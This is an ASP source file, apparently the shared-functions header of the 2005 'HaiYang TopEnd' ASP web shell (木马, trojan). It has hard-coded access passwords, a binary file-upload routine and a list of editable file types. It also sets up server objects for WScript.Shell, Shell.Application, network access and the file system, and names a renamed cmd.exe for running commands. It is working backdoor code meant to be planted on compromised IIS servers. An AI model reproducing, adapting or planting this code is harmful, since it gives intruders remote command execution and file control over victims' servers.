<%
'	option explicit

	dim url,shellStr,applicationStr,pageName,startTime

	shellStr="Shell"
	applicationStr="Application"

	startTime=timer()
	session.timeout=40
	pageName=request("pageName")
	url=request.serverVariables("url")

	const m="xxxxx"
	const mVersion="4.00"
	const userPassword="sunc" '登录密码
	const adminPassword="hididi" '二次密码
	const clientPassword="#" '客户端密码,如果要插入数据库,则只能设置一位,请只使用数字和字母的组合
	const sqlMaxLoopI=100
	const notdownloadsExists=false
	const myCmdDotExeFile="command.exe" '自己的cmd.exe文件名,如果不方便改源程序,执行时要在路径后面多加上 /c 
	const editableFileExt="$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$bat$lst$aspx$php3$php4$js$css$bat$asa$"
	
	rem +--------------------------------------+
	rem |	    这下面是页面的公共函数部分	   |
	rem +--------------------------------------+
	
	sub echo(str)
		response.write(str)
	end sub
	
	sub onErr(str)
		response.write("出错信息: "&str&"")
		response.end()
	end sub
	
	sub isIn(flag)
		if flag=1 then
			if session(m&"userPassword")<>userPassword then
				echo "<script language=""javascript"">alert('对不起,没有权限的操作,请先登录!');location.href='?pageName=default';</script>"
				response.end
			end if
		 else
		 	isIn(1)
			if session(m&"adminPassword")<>adminPassword then
				echo "<script language=""javascript"">if(confirm('此操作要求二次鉴权\n现在进行这项操作吗?')){location.href='?pageName=login';}else{history.back();}</script>"
				response.end
			end if
		end if
	end sub
	
	function getTheSize(str)
		dim theSize
		theSize=str
		if theSize>=(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024*1024))*10)/10&"G"
		if theSize>=(1024*1024) and theSize<(1024*1024*1024) then getTheSize=fix((theSize/(1024*1024))*10)/10&"M"
		if theSize>=1024 and theSize<(1024*1024) then getTheSize=fix((theSize/1024)*10)/10&"K"
		if theSize>=0 and theSize <1024 then getTheSize=theSize&"B"
	end function
	
	function getStrLen(str)
		dim i
		getStrLen=0
		for i=1 to len(str)
			if asc(mid(str,i,1))>0 and asc(mid(str,i,1))<256 then
				getStrLen=getStrLen+1
			 else
				getStrLen=getStrLen+2
			end if
		next
	end function
	
	function getCutStr(str,n)
		dim i,j
		if n>len(str) then
			n=len(str)
		end if
		for i=1 to n
			if asc(mid(str,i,1))<=0 or asc(mid(str,i,1))>=256 then
				j=j+1
			end if
		next
		getCutStr=left(str,n-j)
	end function
	
	sub redirectTo(url)
		response.redirect(url)
	end sub
	
	sub showTitle(str)
'		response.write("<meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"&vbNewLine)
		response.write("<title>"&str&" - 海阳顶端网ASP木马＠2005官方正式版 - By Marcos & LCX & Allen</title>")
	end sub
	
	sub showExecuteTime()
		response.write("<br><center>"&((timer-startTime)*1000)&" ms</center>")
	end sub
	
	function getParentFolder(thePath)
		dim path
		path=thePath
		if right(path,1)="\" then
			path=left(path,len(path)-1)
		end if

		if instr(path,"\")>0 then
			getParentFolder=left(path,instrRev(path,"\"))
		 else
			getParentFolder=""
		end if
	end function
	
	sub chkErr(err,message)
		if err then
			err.clear
			response.write "<script language=""javascript"">alert('"&message&"');</script>"
			response.end
		end if
	end sub
	
	function encodeForUrl(str,flag)
		if flag=true then
			encodeForUrl=replace(str,"\","\\")
			encodeForUrl=replace(encodeForUrl,"'","\'")
		 else
			encodeForUrl=server.urlEncode(str)
		 	encodeForUrl=replace(encodeForUrl,"%5C","\")
		end if
	end function
	
	function fixNull(str)
		if isNull(str) then
			fixNull=""
		 else
			fixNull=str
		end if
	end function
	
	sub streamUpload(thePath,fileName)
		dim i,j,info,stream,streamT,theFile,overWrite,fileContent
		theFile=request("theFile")
		overWrite=request("overWrite")
		if instr(fileName,":") then
			fileName=fileName
		 else
			fileName=thePath&"\"&fileName
		end if
		server.scriptTimeOut=5000
		set stream=server.createObject("adodb.stream")
		set streamT=server.createObject("adodb.stream")
		
		with stream
			.type=1
			.mode=3
			.open
			.write request.binaryRead(request.totalBytes)
			.position=0
			fileContent=.read()
			i=instrB(fileContent,chrB(13)&chrB(10))
			info=leftB(fileContent,i-1)
			i=len(info)+2
			i=instrB(i,fileContent,chrB(13)&chrB(10)&chrB(13)&chrB(10))+4-1
			j=instrB(i,fileContent,info)-1
			streamT.Type=1
			streamT.Mode=3
			streamT.Open
			stream.position=i
			.copyTo streamT,j-i-2

			on error resume next
			if overWrite="true" then
				streamT.saveToFile fileName,2
			 else
				streamT.saveToFile fileName
			end if

			if err.number=3004 then
				err.clear
				fileName=fileName&"\"&split(theFile,"\")(uBound(split(theFile,"\")))
				if overWrite="true" then
					streamT.saveToFile fileName,2
				 else
					streamT.saveToFile fileName
				end if
			end if
			
			chkErr err,err.description&"\n可能同名文件已经存在.');history.back('"
			echo "<script language=""javascript"">alert('文件上传成功!\n"&replace(fileName,"\","\\")&"');</script>"

			streamT.close
			.close
		end with

		set stream=nothing
		set streamT=nothing
	end sub	
%>
<script language="javascript" src="js.js"></script>
<link href="css.css" rel="stylesheet" type="text/css">
<object runat="server" id="ws" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat="server" id="net" scope="page" classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
<object runat="server" id="net" scope="page" classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>